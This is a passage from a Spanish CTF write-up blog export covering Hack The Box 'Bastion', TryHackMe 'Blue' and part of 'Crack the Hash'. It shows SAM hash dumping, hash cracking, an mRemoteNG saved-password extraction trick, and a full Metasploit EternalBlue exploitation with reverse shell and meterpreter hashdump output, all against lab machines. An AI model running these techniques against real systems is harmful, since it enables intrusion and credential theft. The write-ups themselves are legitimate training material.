seconds SMB Escaneo de sharenames en SMB con smbclient.\n1 2 3 4 5 6 7 8 9 10 11 12 root@sckull:~/htb/bastion# smbclient -L \\\\10.10.10.134 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Backups Disk C$ Disk Default share IPC$ IPC Remote IPC Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available SMB - Backups Encontramos una nota (note.txt) en el sharename de Backups, esta nos habla de un backup.\nnote.txt\nTambien encontramos una carpeta de un backup de la maquina en \\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\ dentro encontramos varios archivos xml y archivo vhd.\nSMB - Montar archivo VHD Mount VHD stored\nPara poder ver lo que contiene el archivo backup en SMB montamos el SHARENAME localmente para luego hacer lo mismo con el backup y poder ver los archivos en su interior. Para ello utilizamos una maquina Windows.\nComandos:\n1 2 3 4 5 6 7 net use h: \\\\10.10.10.134\\Backups DISKPART SELECT VDISK FILE=\u0026#34;H:\\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd\u0026#34; ATTACH VDISK ASSIGN LETTER=E exit dir e: SAM-SYSTEM HASHES Ahora que tenemos acceso al backup de la maquina podemos buscar contraseñas guardadas, existen diferentes lugares y archivos donde podemos encontrar contraseñas almacenadas (Password Stored), en esta maquina las encontramos en C:\\Windows\\System32\\config\\, donde podemos ver dos archivos uno llamado SAM y otro SYSTEM los cuales contienen hashes de autenticacion almacenadas por SAM (Security Account Manager).\nPara obtener los hash podemos utilizar mimikatz y samdump2.\nMIMIKATZ 1 mimikatz - lsadump::sam SAMDUM2 Utilizamos los hash para ver los permisos del usuario L4mpje en los SHARENAMES.\n1 aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 Crack HASHES HASHCAT 1 hashcat/hashcat64.bin -m 1000 bastion.txt rockyou.txt -o bastion_pass.txt JOHN 1 john --format=NT-old --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Cracked:\n26112010952d963c8dc4217daec986d9:bureaulampje\nUSER - L4mpje Ahora que tenemos la contraseña para el usuario L4ampje podemos logearnos en el servicio ssh.\nObtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION - nRemoteNG Al enumerar los programas nos encontramos con uno no muy comun en maquinas windows mRemoteNG.\nAl investigar un poco sobre este programa y sus vulnerabilidades encontramos que los archivos de configuracion contienen contraseñas encriptadas y las cuales pueden ser facilmente desencriptadas (Stealing Password from mremote). Aparentemente es una vulnerabilidad que no afecta a esta version del programa.\nArchivos de configuracion (c:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG).\nUtilizamos mRemoteNG para ver el fuincionamiento de los archivos de configuracion. Para ello creamos un nuevo archivo de configuracion agregamos las credenciales del usuario L4mpje y utilizamos la opcion de SSH2, como vemos nos pudimos conectar exitosamente mediante ssh con el programa.\nAl guardar el archivo de conexion vemos que es un archivo XML, dicho archivo tiene la misma estructura del archivo de configuracion que tiene la maquina en AppData. Eliminamos la conexion de la lista de conexiones en mRemoteNG e importamos nuevamente el archivo que habiamos guardado (Bastion_file.xml), al cargarse este archivo se cargaron las credenciales y la configuracion de SSH2 anteriormente realizadas.\nEstructura del archivo XML\nAhora que sabemos que podemos importar un archivo de configuracion, vamos a intentar impoartar el archivo de configuracion que esta en la maquina, para ello lo descargamos. Vemos la misma configuracion que tiene nuestro archivo que guardamos anteriormente.\nImportamos el archivo al programa y nos muestra dos conexiones una del usuario Administrador y de L4mpje.\nConexion DC\nConexion L4mpje-PC\nComo podemos ver las direcciones IP a las que estan configuradas esas conexiones son locales vamos a cambiarlas y dirigirlas a la IP de la maquina (10.10.10.134), de la misma forma para el SSH e intentamos conectarnos.\nL4mpje\nAdministrator - Shell Finalmente obtenemos una shell como Administrador y nuestra bandera root.txt.\nAl investigar acerca del crackeo de Contraseñas, encontre un post mRemote Crack Password en el cual muestra que podemos sacar la contraseña de cualquier conexion o configuracion de conexion mediante la creacion de una Herramienta externa con los siguientes datos:\n1 2 File Name : cmd Arguments : /k echo %password% Para extraer la contraseña seleccionamos la conexion y le damos a ejecutar Herramienta externa \u0026gt; Seleccionamos la que hemos creado.\nAsi es como obtenemos la contraseña de Administrator y L4mpje.\n1 2 Administrator:thXLHM96BeKL0ER2 L4mpje:bureaulampje ","description":"Bastion es una maquina con dificultad facil, tiene un Disco Duro Virtual (VHD) expuesto en recurso de SAMBA, utilizando Windows montamos el disco y obtuvimos los hashes con mimikatz seguidamente con John una contraseña lo que nos dio acceso al servicio SSH. Importando el archivo de configuracion de mRemoteNG nos permitió obtener credenciales y escalar privilegios.","id":189,"section":"posts","tags":["smbclient","smbmap","vhd","mimikatz","samdump2","nRemoteNG"],"title":"Hack The Box - Bastion","uri":"https://sckull.github.io/posts/bastion/"},{"content":"\rBlue es una maquina de TryHackMe, presenta una vulnerabilidad Eternal Blue, utilizamos metasploit para configurar y explotar la vulnerabilidad encontrada y obtener las flags.\nRoom Titulo Blue Descripción Deploy \u0026amp; hack into a Windows machine, leveraging common misconfigurations issues. Puntos 630 Dificultad Facil Maker DarkStar7471 MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 root@kali:~/trymehack/blue# masscan -p1-65535,U:1-65535 10.10.24.91 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-04 00:56:01 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49153/tcp on 10.10.24.91 Discovered open port 49154/tcp on 10.10.24.91 Discovered open port 49152/tcp on 10.10.24.91 Discovered open port 137/udp on 10.10.24.91 Discovered open port 3389/tcp on 10.10.24.91 # Nmap 7.70 scan initiated Tue Sep 3 21:03:21 2019 as: nmap -sC -sV -p1-1000 -o nmap.scan_mil 10.10.24.91 Nmap scan report for 10.10.24.91 Host is up (0.23s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:ae:0a:27:4e:02 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-09-03T20:04:00-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-09-03 21:04:00 |_ start_date: 2019-09-03 20:54:40 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 21:04:06 2019 -- 1 IP address (1 host up) scanned in 45.67 seconds SMBCLIENT \u0026amp; SMBMAP Escaneo de sharenames.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@kali:~/trymehack/blue# smbclient -L \\\\10.10.24.91 Enter WORKGROUP\\root\u0026#39;s password: Anonymous login successful Sharename Type Comment --------- ---- ------- smb1cli_req_writev_submit: called for dialect[SMB2_10] server[10.10.24.91] Error returning browse list: NT_STATUS_REVISION_MISMATCH Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.24.91 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available root@kali:~/trymehack/blue# smbmap -H 10.10.24.91 [+] Finding open SMB ports.... root@kali:~/trymehack/blue# NMAP - SMB SCRIPTS Utilizamos los scripts de nmap para verificar si alguno es vulnerable con la maquina, y, encontramos que es vulnerable a ms17-010 o ETERNALBLUE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 root@kali:~/trymehack/blue# nmap --script smb-vuln-* 10.10.24.91 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 21:11 EDT Nmap scan report for 10.10.24.91 Host is up (0.20s latency). Not shown: 991 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49158/tcp open unknown 49159/tcp open unknown Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 42.25 seconds METASPLOIT - ETERNALBLUE Utilizamos metasploit y el exploit exploit/windows/smb/ms17_010_eternalblue contra la maquina, lo configuramos y corremos el exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 msf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhosts 10.10.24.91 rhosts =\u0026gt; 10.10.24.91 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show targets Exploit targets: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.1.72:4444 [+] 10.10.24.91:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.24.91:445 - Connecting to target for exploitation. [+] 10.10.24.91:445 - Connection established for exploitation. [+] 10.10.24.91:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.24.91:445 - CORE raw buffer dump (42 bytes) [*] 10.10.24.91:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.24.91:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.24.91:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.24.91:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.24.91:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.24.91:445 - Sending all but last fragment of exploit packet [*] 10.10.24.91:445 - Starting non-paged pool grooming [+] 10.10.24.91:445 - Sending SMBv2 buffers [+] 10.10.24.91:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.24.91:445 - Sending final SMBv2 buffers. [*] 10.10.24.91:445 - Sending last fragment of exploit packet! [*] 10.10.24.91:445 - Receiving response from exploit packet [+] 10.10.24.91:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.24.91:445 - Sending egg to corrupted connection. [*] 10.10.24.91:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196) at 2019-09-03 21:15:49 -0400 [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt; UPGRADE SHELL - METERPRETER Utilizamos el eexploit de post explotacion multi/manage/shell_to_meterpreter para actualizar nuestra shell a meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196 (10.10.24.91) msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; search shell_to_meterpreter Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 post/multi/manage/shell_to_meterpreter normal No Shell to Meterpreter Upgrade msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set session 1 session =\u0026gt; 1 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.1.72:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (179779 bytes) to 10.10.24.91 [*] Meterpreter session 2 opened (10.8.1.72:4433 -\u0026gt; 10.10.24.91:49203) at 2019-09-03 21:21:37 -0400 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196 (10.10.24.91) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.1.72:4433 -\u0026gt; 10.10.24.91:49203 (10.10.24.91) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; METASPLOIT - HASHDUMP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 meterpreter \u0026gt; run post/windows/gather/hashdump [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... Jon:\u0026#34;Nah boi, I ain\u0026#39;t sharing nutting with you\u0026#34; [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter \u0026gt; JOHN - CRACK PASSWORDS Crackeamos las contraseñas con john.\n1 2 3 4 5 6 7 8 9 10 11 12 root@kali:~/trymehack/blue# john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status (Administrator) alqfna22 (Jon) 2g 0:00:00:00 DONE (2019-09-03 21:34) 2.061g/s 10515Kp/s 10515Kc/s 10520KC/s alqui..alpusidi Warning: passwords printed above might not be all those cracked Use the \u0026#34;--show --format=NT\u0026#34; options to display all of the cracked passwords reliably Session completed root@kali:~/trymehack/blue# FLAGS Encontrando las flags.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 meterpreter \u0026gt; ls Listing: C:\\ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-13 23:18:56 -0400 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:08 -0400 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-12 18:01:17 -0500 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Users 40777/rwxrwxrwx 16384 dir 2009-07-13 23:20:08 -0400 Windows 100666/rw-rw-rw- 24 fil 2018-12-12 22:47:39 -0500 flag1.txt 567211570/r-xrwx--- 438533065912909807 fif 13905563959-04-24 15:54:40 -0400 hiberfil.sys 567211570/r-xrwx--- 438533065912909807 fif 13905563959-04-24 15:54:40 -0400 pagefile.sys meterpreter \u0026gt; cat flag1.txt flag{******************} meterpreter \u0026gt; pwd C:\\ meterpreter \u0026gt; Utilizamos dir para encontrar los archivos que lleven el nombre de \u0026ldquo;flag\u0026rdquo;.\nComando:\n1 dir flag* /s /p 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 C:\\\u0026gt;dir flag* /s /p dir flag* /s /p Volume in drive C has no label. Volume Serial Number is E611-0B66 Directory of C:\\ 03/17/2019 02:27 PM 24 flag1.txt 1 File(s) 24 bytes Directory of C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent 03/17/2019 02:26 PM 482 flag1.lnk 03/17/2019 02:30 PM 848 flag2.lnk 03/17/2019 02:32 PM 2,344 flag3.lnk 3 File(s) 3,674 bytes Directory of C:\\Users\\Jon\\Documents 03/17/2019 02:26 PM 37 flag3.txt 1 File(s) 37 bytes Total Files Listed: 5 File(s) 3,735 bytes 0 Dir(s) 22,796,713,984 bytes free C:\\\u0026gt; C:\\\u0026gt;type C:\\Users\\Jon\\Documents\\flag3.txt type C:\\Users\\Jon\\Documents\\flag3.txt flag{*******************************} C:\\\u0026gt; C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;type flag2.lnk type flag2.lnk L�F� h+汖��h+汖��=]�����\u0026#39;P�O� �:i�+00�/C:\\R1�M�Windows��:���M�*pWindowsV1qN��System32��:��qN��*\tSystem32P1�Mconfig��:���M*�\tconfigX2\u0026#39;�M flag2.txtﾍM�M*�flag2.txtS-Rf �C:\\Windows\\System32\\config\\flag2.txt6..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\config\\flag2.txt�C:\\Windows\\System32\\config(\t�1SPS�XF�L8C���\u0026amp;�m�`�Xjon-pc��̴�H�C�Kz�k��:������d)d�4 C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;dir /ah C:\\Windows\\System32\\config dir /ah C:\\Windows\\System32\\config Volume in drive C has no label. Volume Serial Number is E611-0B66 Directory of C:\\Windows\\System32\\config File Not Found C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt; Nuestra flag2 se encuentra en C:\\Windows\\System32\\config*.\n1 2 3 4 C:\\Windows\\system32\u0026gt;type C:\\Windows\\System32\\config\\flag2.txt type C:\\Windows\\System32\\config\\flag2.txt flag{****************************} C:\\Windows\\system32\u0026gt; ","description":"Blue es una maquina de TryHackMe, presenta una vulnerabilidad Eternal Blue, utilizamos metasploit para configurar y explotar la vulnerabilidad encontrada y obtener las flags.","id":190,"section":"posts","tags":["eternalblue","ms17_010","smbclient","metasploit"],"title":"TryHackMe - Blue","uri":"https://sckull.github.io/posts/blue-thm/"},{"content":"\rCrack The Hash es una serie de retos de TryHackMe que presenta diferentes Hashes las cuales identificamos con hash-identifier y Hash-Analyzer, y crackeamos con Hashcat y CrackStation.\nRoom Titulo Crack the hash Descripción Cracking hashes challenges Puntos 320 Dificultad Facil Maker ben CRACK THE HASH En esta serie de retos nos proveen de distintas hashes las cuales debemos de crackear y enviar el resultado de cada una de estas, al principio utilizamos hash-identifier, hash analyzer y hash identification para identificar el tipo de hash y para el crackeo de los hashes utilizamos hashcat y crackstation.\nLinks de la herramientas y paginas utilizadas:\nhash-identifier hash-analyzer hahs-identification hashcat crackstation NIVEL 1 #1 MD5 Hash:\n48bb6e862e54f2a795ffc4e541caed4d\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 root@kali:~# hash-identifier ######################################################################### #\t__ __ __\t______ _____\t# #\t/\\ \\/\\ \\\t/\\ \\ /\\__ _\\ /\\ _ `\\\t# #\t\\ \\ \\_\\ \\ __ ____ \\ \\ \\___\t\\/_/\\ \\/ \\ \\ \\/\\ \\\t# #\t\\ \\ _ \\ /\u0026#39;__`\\ / ,__\\ \\ \\ _ `\\\t\\ \\ \\ \\ \\ \\ \\ \\\t# #\t\\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\\t\\_\\ \\__ \\ \\ \\_\\ \\\t# #\t\\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/\t# #\t\\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.1 # #\tBy Zion3R # #\twww.Blackploit.com # #\tRoot@Blackploit.com # ######################################################################### ------------------------------------------------------------------------- HASH: 48bb6e862e54f2a795ffc4e541caed4d Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) ------------------------------------------------------------------------- HASHCAT 1 ./hashcat64.bin -m 0 hash.txt rockyou.txt CrackStation Crackeada:\neasy:48bb6e862e54f2a795ffc4e541caed4d\n#2 SHA1 Hash:\nCBFDAC6008F9CAB4083784CBD1874F76618D2A97\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 HASH: CBFDAC6008F9CAB4083784CBD1874F76618D2A97 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Least Possible Hashs: [+] Tiger-160 [+] Haval-160 [+] RipeMD-160 [+] SHA-1(HMAC) [+] Tiger-160(HMAC) [+] RipeMD-160(HMAC) [+] Haval-160(HMAC) [+] SHA-1(MaNGOS) [+] SHA-1(MaNGOS2) [+] sha1($pass.$salt) [+] sha1($salt.$pass) [+] sha1($salt.md5($pass)) [+] sha1($salt.md5($pass).$salt) [+] sha1($salt.sha1($pass)) [+] sha1($salt.sha1($salt.sha1($pass))) [+] sha1($username.$pass) [+] sha1($username.$pass.$salt) [+] sha1(md5($pass)) [+] sha1(md5($pass).$salt) [+] sha1(md5(sha1($pass))) [+] sha1(sha1($pass)) [+] sha1(sha1($pass).$salt) [+] sha1(sha1($pass).substr($pass,0,3)) [+] sha1(sha1($salt.$pass)) [+] sha1(sha1(sha1($pass))) [+] sha1(strtolower($username).$pass) ------------------------------------------------------------------------- HASHCAT 1 ./hashcat64.bin -m 100 hash.txt rockyou.txt Crackstation Crackeada:\npassword123:CBFDAC6008F9CAB4083784CBD1874F76618D2A97\n#3 SHA256 Hash:\n1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 HASH: 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 Possible Hashs: [+] SHA-256 [+] Haval-256 Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5($pass)) [+] SHA-256(sha1($pass)) ------------------------------------------------------------------------- HASHCAT 1 ./hashcat64.bin -m 1400 hash.txt rockyou.txt CrackStation Crackeada:\nletmein:1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032\n#4 BCRYPT Hash:\n$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom\nHash-Analyzer Identificamos este hash con la pagina Tunnelsup y Utilizamos hashcat para poder desencriptar el hash el cual tomo mucho tiempo.\nHASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 3200 hash.txt ../rockyou.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 72 Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 Cracking performance lower than expected? * Append -w 3 to the commandline. This can cause your screen to lag. * Update your OpenCL runtime / driver the right way: https://hashcat.net/faq/wrongdriver * Create more work items to make use of your parallelization power: https://hashcat.net/faq/morework [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Session..........: hashcat Status...........: Running Hash.Type........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRom Time.Started.....: Thu Sep 5 15:31:19 2019 (10 mins, 43 secs) Time.Estimated...: Tue Oct 8 02:23:53 2019 (32 days, 10 hours) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) 